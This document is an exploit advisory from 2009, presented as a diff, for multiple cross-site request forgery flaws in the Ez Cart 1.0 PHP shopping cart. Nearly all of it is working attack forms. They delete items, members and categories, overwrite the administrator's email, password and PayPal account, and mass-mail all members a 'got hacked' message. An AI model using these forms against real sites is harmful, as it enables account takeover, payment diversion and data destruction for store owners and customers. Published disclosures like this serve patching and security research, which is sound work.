@@ -1,0 +1,79 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Ez Cart Multiple XSRF Vulnerabilities
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 15. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: Ez Cart
+[#] Version: 1.0
+[#] Platform: PHP
+[#] Link: http://www.scriptsez.net/?action=details&cat=Content%20Management&id=2472658093
+[#] Price: 25 USD
+[#] Vulnerability: Multiple XSRF Vulnerabilities
+[#-----------------------------------------------------------------------------------------------#]
+
+[#]Content
+ |--Remove item by id
+ |--Remove member by id (not tested)
+ |--Remove category by id
+ |--Change admin info
+ |--Send emails to all members
+
+[+]Remove item by id
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/ezcart_demo/admin.php?action=delete&id=[ID]"
+method="post">
+  <input type="hidden" name="jid" value="3">
+  <input type="hidden" name="confirm" value="yes">
+  <input type="submit" name="submit" value=" YES ">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[+]Remove member by id (not tested)
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/ezcart_demo/admin.php?action=confirm"
+method="post">
+  <input type="hidden" name="id" value="[ID]">
+  <input type="hidden" name="do" value="yes">
+  <input type="submit" name="submit" value=" YES ">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[+]Remove category by id
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/ezcart_demo/admin.php?action=categories&do=delete&op=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[*]Change admin info
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/ezcart_demo/admin.php?action=admin_opt"
+method="post">
+  <input type="hidden" name="email" value="my@mail.com">
+  <input type="hidden" name="password" value="hacked">
+  <input type="hidden" name="company" value="Ez Cart Company">
+  <input type="hidden" name="paypal" value="paypal[at]account">
+  <input type="hidden" name="checkout" value="000000">
+  <input type="hidden" name="shipping" value="5">
+  <input type="hidden" name="currency" value="USD">
+  <input type="hidden" name="add" value="true">
+  <input type="submit" value=" CHANGE ">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[+]Send emails to all members
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/ezcart_demo/admin.php?action=newsletter"
+method="post">
+<input type="hidden" name="subject" value="got hacked">
+<input type="hidden" name="message" value="this is my message">
+<input type="hidden" name="send" value="true">
+<input type="submit" name="submit" value=" Send ">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#]EOF
